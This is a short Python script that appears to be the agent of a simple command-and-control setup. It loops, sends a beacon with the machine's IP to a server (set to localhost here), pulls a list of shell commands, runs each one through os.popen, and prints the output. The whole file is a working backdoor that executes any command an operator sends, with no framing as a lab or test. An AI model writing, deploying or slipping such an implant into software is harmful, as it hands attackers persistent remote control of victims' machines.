#!/usr/bin/python3
import os, requests, time, socket, json

def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
	
	
while True:
	ip = getIP()
	commands = requests.get('http://localhost/beacon?ip=' + ip)
	if commands.status_code == 500:
		continue
	commands = json.loads(str(commands.content, 'utf-8'))
	if commands != None:
		for cmd in commands:
			print(os.popen(cmd).read())
		commands = ''
		commands = requests.get('http://localhost/confirm?ip=' + ip)
	
	time.sleep(10)